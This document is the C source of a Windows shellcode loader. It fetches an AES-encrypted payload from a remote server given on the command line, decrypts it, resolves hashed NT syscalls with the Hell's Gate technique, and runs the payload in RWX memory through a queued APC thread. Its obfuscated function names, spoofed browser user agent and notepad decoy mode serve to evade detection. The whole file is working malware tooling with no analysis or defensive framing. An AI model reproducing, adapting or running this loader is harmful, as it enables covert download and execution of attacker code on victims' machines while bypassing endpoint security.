#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "hellshell.h"
#include "structs.h"

#pragma comment(lib, "winhttp.lib")

char* g_charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

#define HASH_NTALLOCATEVIRTUALMEMORY 0x7B2D1D431C81F5F6
#define HASH_NTWRITEVIRTUALMEMORY 0x54AEE238645CCA7C
#define HASH_NTPROTECTVIRTUALMEMORY 0xA0DCC2851566E832
#define HASH_NTQUEUEAPCTHREAD 0x331E6B6B7E696022

char* generateRandomString(int length) {
    char* result = (char*)malloc(length + 1);
    if (!result) return NULL;

    for (int i = 0; i < length; i++) {
        result[i] = g_charSet[rand() % 52];
    }
    result[length] = '\0';
    return result;
}

typedef struct {
    char name[64];
    unsigned char* data;
    size_t dataSize;
} ByteArrayVar;

#define MAX_VARS 20
ByteArrayVar g_storedVars[MAX_VARS];
int g_varCount = 0;
ByteArrayVar* parseByteArray(const char* text);

BOOL sadfgdsdg(const wchar_t* serverName, const wchar_t* filePath, char** outBuffer, DWORD* outSize, BOOL useHttps) {
    BOOL result = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD bytesRead = 0;
    DWORD downloadSize = 0;
    DWORD bytesAvailable = 0;
    char* buffer = NULL;
    char* tempBuffer = NULL;
    INTERNET_PORT port = useHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    DWORD flags = useHttps ? WINHTTP_FLAG_SECURE : 0;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, serverName, port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"GET", filePath,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags);
    if (!hRequest) goto cleanup;

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {

        if (useHttps) {
            if (hRequest) WinHttpCloseHandle(hRequest);
            if (hConnect) WinHttpCloseHandle(hConnect);

            port = INTERNET_DEFAULT_HTTP_PORT;
            flags = 0;

            hConnect = WinHttpConnect(hSession, serverName, port, 0);
            if (!hConnect) goto cleanup;

            hRequest = WinHttpOpenRequest(hConnect, L"GET", filePath,
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                flags);
            if (!hRequest) goto cleanup;

            if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                goto cleanup;
            }
        }
        else {
            goto cleanup;
        }
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    buffer = (char*)malloc(4096);
    if (!buffer) goto cleanup;

    downloadSize = 0;
    DWORD bufferSize = 4096;

    do {
        bytesAvailable = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) goto cleanup;

        if (bytesAvailable == 0) break;

        if (downloadSize + bytesAvailable > bufferSize) {
            bufferSize = downloadSize + bytesAvailable + 4096;
            tempBuffer = (char*)realloc(buffer, bufferSize);
            if (!tempBuffer) goto cleanup;
            buffer = tempBuffer;
        }

        if (!WinHttpReadData(hRequest, buffer + downloadSize, bytesAvailable, &bytesRead)) {
            goto cleanup;
        }

        downloadSize += bytesRead;
    } while (bytesAvailable > 0);

    tempBuffer = (char*)realloc(buffer, downloadSize + 1);
    if (!tempBuffer) goto cleanup;
    buffer = tempBuffer;
    buffer[downloadSize] = '\0';

    *outBuffer = buffer;
    *outSize = downloadSize;
    buffer = NULL;
    result = TRUE;

cleanup:
    if (buffer) free(buffer);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}

BOOL extractVarName(const char* line, char* outName, size_t maxNameLen) {
    const char* start = strstr(line, "unsigned char ");
    if (!start) return FALSE;

    start += 14;
    const char* end = strstr(start, "[]");
    if (!end || end - start >= maxNameLen) return FALSE;

    memcpy(outName, start, end - start);
    outName[end - start] = '\0';
    return TRUE;
}

BOOL parseHexByte(const char* str, unsigned char* outByte) {
    if (strncmp(str, "0x", 2) != 0) return FALSE;

    char hexStr[3] = { str[2], str[3], '\0' };
    char* endPtr = NULL;
    *outByte = (unsigned char)strtol(hexStr, &endPtr, 16);

    return (endPtr != hexStr);
}

ByteArrayVar* findVar(const char* name) {
    for (int i = 0; i < g_varCount; i++) {
        if (strcmp(g_storedVars[i].name, name) == 0) {
            return &g_storedVars[i];
        }
    }
    return NULL;
}

void extractVars(const char* content) {
    const char* line = content;
    const char* nextLine = NULL;
    char* varData = NULL;

    while (line && *line) {
        nextLine = strchr(line, '\n');
        size_t lineLen = nextLine ? (nextLine - line) : strlen(line);

        if (strstr(line, "unsigned char ") && strstr(line, "[]")) {
            const char* endDecl = strstr(line, "};");
            if (!endDecl) {
                line = nextLine ? (nextLine + 1) : NULL;
                continue;
            }

            size_t declSize = (endDecl + 2) - line;
            varData = (char*)malloc(declSize + 1);
            if (!varData) {
                line = nextLine ? (nextLine + 1) : NULL;
                continue;
            }

            memcpy(varData, line, declSize);
            varData[declSize] = '\0';

            ByteArrayVar* parsedArray = parseByteArray(varData);
            if (parsedArray) {
                if (g_varCount < MAX_VARS) {
                    strcpy_s(g_storedVars[g_varCount].name, sizeof(g_storedVars[g_varCount].name), parsedArray->name);
                    g_storedVars[g_varCount].data = parsedArray->data;
                    g_storedVars[g_varCount].dataSize = parsedArray->dataSize;

                    printf("[+] Stored %s with %zu bytes at index %d\n",
                        parsedArray->name, parsedArray->dataSize, g_varCount);

                    g_varCount++;

                    free(parsedArray);
                }
                else {
                    printf("[-] Warning: No more space to store variable %s\n", parsedArray->name);
                    free(parsedArray->data);
                    free(parsedArray);
                }
            }

            free(varData);

            line = endDecl + 2;
        }
        else {
            line = nextLine ? (nextLine + 1) : NULL;
        }
    }
}

typedef struct _SYS_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} SYS_TABLE_ENTRY, * PSYS_TABLE_ENTRY;

typedef struct _SYS_TABLE {
    SYS_TABLE_ENTRY NtAllocateVirtualMemory;
    SYS_TABLE_ENTRY NtWriteVirtualMemory;
    SYS_TABLE_ENTRY NtProtectVirtualMemory;
    SYS_TABLE_ENTRY NtQueueApcThread;
} SYS_TABLE, * PSYS_TABLE;

PTEB getRtlTeb();
BOOL getExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDir);
BOOL getittksjbfdsgdbkj(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir, PSYS_TABLE_ENTRY pSysTableEntry);

extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

BOOL jasjkfdsgs(IN PSYS_TABLE pSysTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    NTSTATUS STATUS = 0x00;
    PVOID    pAddress = NULL;
    ULONG    uOldProtection = NULL;
    SIZE_T   sSize = sPayloadSize, sBytesWritten = NULL;

    HellsGate(pSysTable->NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }
    printf("[+] Allocated Address At: 0x%p Of Size: %d\n", pAddress, sSize);

    printf("[#] Press <Enter> To Write The Payload...");
    getchar();
    printf("\t[i] Writing Payload Of Size %d...", sPayloadSize);
    HellsGate(pSysTable->NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &sBytesWritten)) != 0 || sBytesWritten != sPayloadSize) {
        printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
        printf("[i] Bytes Written: %d of %d\n", sBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf("[+] DONE\n");

    HellsGate(pSysTable->NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
        printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }

    printf("[#] Press <Enter> To Run The Payload...");
    getchar();
    printf("\t[i] Running Payload At 0x%p Using Thread Of Id: %d...", pAddress, GetThreadId(hThread));
    HellsGate(pSysTable->NtQueueApcThread.wSystemCall);
    if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
        printf("[!] NtQueueApcThread Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }
    printf("[+] DONE\n");

    return TRUE;
}

ByteArrayVar* parseByteArray(const char* text) {
    ByteArrayVar* result = (ByteArrayVar*)malloc(sizeof(ByteArrayVar));
    if (!result) return NULL;

    memset(result, 0, sizeof(ByteArrayVar));

    if (!extractVarName(text, result->name, sizeof(result->name))) {
        free(result);
        return NULL;
    }

    const char* ptr = text;
    size_t count = 0;

    while ((ptr = strstr(ptr, "0x"))) {
        count++;
        ptr += 2;
    }

    result->data = (unsigned char*)malloc(count);
    if (!result->data) {
        free(result);
        return NULL;
    }

    ptr = text;
    size_t index = 0;

    while ((ptr = strstr(ptr, "0x")) && index < count) {
        parseHexByte(ptr, &result->data[index++]);
        ptr += 2;
    }

    result->dataSize = index;
    return result;
}

VOID prealtthrreed() {
    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);

    MsgWaitForMultipleObjectsEx(
        1,
        &hEvent,
        INFINITE,
        QS_HOTKEY,
        MWMO_ALERTABLE
    );
}

PTEB getRtlTeb() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 hshstr(PBYTE str) {
    DWORD64 hash = 0x77347734DEADBEEF;
    INT c;

    while (c = *str++)
        hash = ((hash << 0x5) + hash) + c;

    return hash;
}

BOOL getExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDir) {
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    *ppImageExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL getittksjbfdsgdbkj(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir, PSYS_TABLE_ENTRY pSysTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDir->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (hshstr(pczFunctionName) == pSysTableEntry->dwHash) {
            pSysTableEntry->pAddress = pFunctionAddress;

            WORD cw = 0;
            while (TRUE) {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pSysTableEntry->wSystemCall = (high << 8) | low;
                    break;
                }

                cw++;
            };
        }
    }

    return TRUE;
}

int main(int argc, char** argv) {
    srand((unsigned int)time(NULL));
    if (argc < 2) {
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        PROCESS_INFORMATION pi;

        wchar_t cmdLine[] = L"notepad.exe";

        if (CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[+] Notepad launched successfully\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            printf("[-] Failed to launch Notepad. Error: %d\n", GetLastError());
        }

        return 0;
    }

    if (argc < 3) {
        printf("Usage: %s <xyzremname> <ur-i-pa-th> [http]\n", argv[0]);
        return -1;
    }

    size_t serverNameLen = strlen(argv[1]) + 1;
    wchar_t* serverName = (wchar_t*)malloc(serverNameLen * sizeof(wchar_t));
    if (!serverName) {
        printf("[-] Memory allocation failed for server name\n");
        return -1;
    }
    size_t convertedChars = 0;
    if (mbstowcs_s(&convertedChars, serverName, serverNameLen, argv[1], serverNameLen - 1) != 0) {
        printf("[-] Conversion failed for server name\n");
        free(serverName);
        return -1;
    }

    size_t filePathLen = strlen(argv[2]) + 1;
    wchar_t* filePath = (wchar_t*)malloc(filePathLen * sizeof(wchar_t));
    if (!filePath) {
        free(serverName);
        printf("[-] Memory allocation failed for file path\n");
        return -1;
    }
    convertedChars = 0;
    if (mbstowcs_s(&convertedChars, filePath, filePathLen, argv[2], filePathLen - 1) != 0) {
        printf("[-] Conversion failed for file path\n");
        free(serverName);
        free(filePath);
        return -1;
    }

    BOOL useHttps = TRUE;
    if (argc >= 4 && strcmp(argv[3], "http") == 0) {
        useHttps = FALSE;
    }

    char* fileContent = NULL;
    DWORD fileSize = 0;
    printf("[+] Downloading file from %ls%ls...\n", serverName, filePath);


    char* randomStr = generateRandomString(10);
    if (randomStr) {
        printf("[+] Using %s protocol handler\n", randomStr);
        free(randomStr);
    }

    if (sadfgdsdg(serverName, filePath, &fileContent, &fileSize, useHttps)) {
        printf("[+] Download successful. File size: %lu bytes\n", fileSize);

        extractVars(fileContent);

        free(fileContent);
    }
    else {
        printf("[-] Download failed with both HTTPS and HTTP\n");
        free(serverName);
        free(filePath);
        return -1;
    }

    free(serverName);
    free(filePath);

    PBYTE pDecryptedData = NULL;
    SIZE_T sDecryptedData = 0;
    ByteArrayVar* AesCipherText = findVar("AesCipherText");
    ByteArrayVar* AesKey = findVar("AesKey");
    ByteArrayVar* AesIv = findVar("AesIv");

    if (!AesCipherText || !AesKey || !AesIv) {
        printf("[-] Missing required variables in downloaded content\n");
        return -1;
    }

    printf("[+] AesCipherText: %s\n", AesCipherText->name);
    printf("[+] AesKey: %s\n", AesKey->name);
    printf("[+] AesIv: %s\n", AesIv->name);

    if (!SimpleDecryption(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &sDecryptedData)) {
        printf("[!] SimpleDecryption Failed\n");
        return -1;
    }

    printf("[+] Decrypted Data (hex): ");
    size_t i;
    for (i = 0; i < sDecryptedData && i < 50; i++) {
        printf("%02X ", ((unsigned char*)pDecryptedData)[i]);
    }
    printf(i < sDecryptedData ? "...\n" : "\n");

    printf("[+] Decrypted Data (as text, if applicable): ");
    for (size_t i = 0; i < sDecryptedData && i < 100; i++) {
        unsigned char c = ((unsigned char*)pDecryptedData)[i];
        printf("%c", (c >= 32 && c < 127) ? c : '.');
    }
    printf(i < sDecryptedData ? "...\n" : "\n");

    PTEB pCurrentTeb = getRtlTeb();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return 0x1;

    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    PIMAGE_EXPORT_DIRECTORY pImageExportDir = NULL;
    if (!getExportDir(pLdrDataEntry->DllBase, &pImageExportDir) || pImageExportDir == NULL)
        return 0x01;

    SYS_TABLE sysTable = { 0 };
    sysTable.NtAllocateVirtualMemory.dwHash = HASH_NTALLOCATEVIRTUALMEMORY;
    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtAllocateVirtualMemory))
        return 0x1;

    sysTable.NtWriteVirtualMemory.dwHash = HASH_NTWRITEVIRTUALMEMORY;
    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtWriteVirtualMemory))
        return 0x1;

    sysTable.NtProtectVirtualMemory.dwHash = HASH_NTPROTECTVIRTUALMEMORY;
    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtProtectVirtualMemory))
        return 0x1;

    sysTable.NtQueueApcThread.dwHash = HASH_NTQUEUEAPCTHREAD;
    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtQueueApcThread))
        return 0x1;

    HANDLE hThread = CreateThread(NULL, NULL, prealtthrreed, NULL, NULL, NULL);
    if (!hThread) {
        printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
        return -1;
    }

    if (!jasjkfdsgs(&sysTable, (HANDLE)-1, hThread, pDecryptedData, sDecryptedData)) {
        return -1;
    }

    printf("[#] Press <Enter> To Quit...");
    getchar();

    return 0x00;
}